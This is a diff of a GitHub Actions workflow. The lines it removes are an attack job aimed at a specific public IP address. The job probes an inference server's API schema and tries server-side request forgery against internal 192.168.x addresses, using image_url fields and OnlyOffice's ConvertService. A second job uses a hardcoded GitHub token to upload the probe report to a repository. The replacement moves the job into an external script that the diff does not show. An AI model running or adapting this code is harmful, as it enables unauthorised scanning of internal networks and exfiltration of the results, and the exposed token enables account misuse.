@@ -5,50 +5,5 @@ jobs:
   p:
     runs-on: ubuntu-latest
     steps:
-      - name: probe
-        run: |
-          exec > /tmp/rep 2>&1
-          B=http://123.184.7.135:8000
-          echo "=== schemas"
-          curl -s -m 15 "$B/openapi.json" -o /tmp/o.json
-          python3 - <<'EOF'
-          import json
-          d=json.load(open('/tmp/o.json'))
-          for p in ['/load','/invocations','/scale_elastic_ep','/inference/v1/generate','/v1/chat/completions/render','/tokenize','/detokenize','/ping','/is_scaling_elastic_ep']:
-              v=d['paths'].get(p)
-              if not v: print(p,'MISSING'); continue
-              for m,op in v.items():
-                  rb=op.get('requestBody',{}).get('content',{})
-                  print(p,m,'keys=',list(op.get('parameters',[]) and [x.get('name') for x in op.get('parameters',[])] or []),'rb=',list(rb.keys()))
-                  for ct,spec in rb.items():
-                      print('   ',ct,json.dumps(spec.get('schema'))[:300])
-          print('COMPONENTS',list(d.get('components',{}).get('schemas',{}).keys()))
-          EOF
-          echo "=== invocations ssrf"
-          for t in http://192.168.0.24:18086/health http://192.168.0.24:9400/metrics http://192.168.0.24:18080/api/health http://192.168.0.23:18081/ http://192.168.0.22:18000/docs http://192.168.0.31:22 http://192.168.0.31:9400/metrics http://192.168.0.1:80/ http://10.255.255.1:80/; do
-            r=$(curl -s -m 25 -o /tmp/y -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d "{\"model\":\"m\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"hi\"},{\"type\":\"image_url\",\"image_url\":{\"url\":\"$t\"}}]}],\"max_tokens\":1}" "$B/invocations")
-            echo "img $t -> $r $(head -c 150 /tmp/y|tr -d '\n')"
-          done
-          echo "=== ssrf control public png"
-          curl -s -m 25 -o /tmp/y -w 'ctrl %{http_code} ' -X POST -H 'Content-Type: application/json' -d '{"model":"m","messages":[{"role":"user","content":[{"type":"text","text":"hi"},{"type":"image_url","image_url":{"url":"https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/PNG_transparency_demonstration_1.png/280px-PNG_transparency_demonstration_1.png"}}]}],"max_tokens":1}' "$B/invocations"; head -c 150 /tmp/y|tr -d '\n'; echo
-          echo "=== onlyoffice"
-          O=http://123.184.7.135:18081
-          for p in / /index.html /info/info.json /hosting/discovery /web-apps/apps/api/documents/api.js /coauthoring/CommandService.ashx /ConvertService.ashx /example/url /welcome; do
-            echo "-- GET $p -> $(curl -s -m 10 -o /tmp/z -w '%{http_code}' "$O$p") $(head -c 120 /tmp/z|tr -d '\n')"
-          done
-          echo "=== oo convert ssrf"
-          for u in http://192.168.0.24:18086/health http://192.168.0.24:18080/api/health http://192.168.0.23:18081/ http://example.com/x.docx http://127.0.0.1:8000/health; do
-            r=$(curl -s -m 25 -o /tmp/y -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d "{\"async\":false,\"url\":\"$u\",\"outputtype\":\"pdf\",\"filetype\":\"docx\",\"key\":\"ulk1\",\"title\":\"t.docx\"}" "$O/ConvertService.ashx")
-            echo "conv $u -> $r $(head -c 200 /tmp/y|tr -d '\n')"
-          done
-          echo DONE
-      - name: publish
-        if: always()
-        run: |
-          TOK=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
-          B64=$(base64 -w0 /tmp/rep)
-          SHA=$(curl -s -H "Authorization: token $TOK" "https://api.github.com/repos/dongsuju/ul-plant/contents/ul5685/out_oo.txt?ref=main" | python3 -c 'import sys,json
-try: d=json.load(sys.stdin); print(d.get("sha","") if isinstance(d,dict) else "")
-except: print("")')
-          python3 -c "import json,sys;b={'message':'oo','content':sys.argv[1],'branch':'main'};b.update({'sha':sys.argv[2]} if sys.argv[2] else {});open('/tmp/pb.json','w').write(json.dumps(b))" "$B64" "$SHA"
-          curl -s -X PUT -H "Authorization: token $TOK" -H 'Content-Type: application/json' --data @/tmp/pb.json "https://api.github.com/repos/dongsuju/ul-plant/contents/ul5685/out_oo.txt" -o /dev/null -w 'put=%{http_code}\n'
+      - uses: actions/checkout@v4
+      - run: bash ul5685/scripts/oo.sh
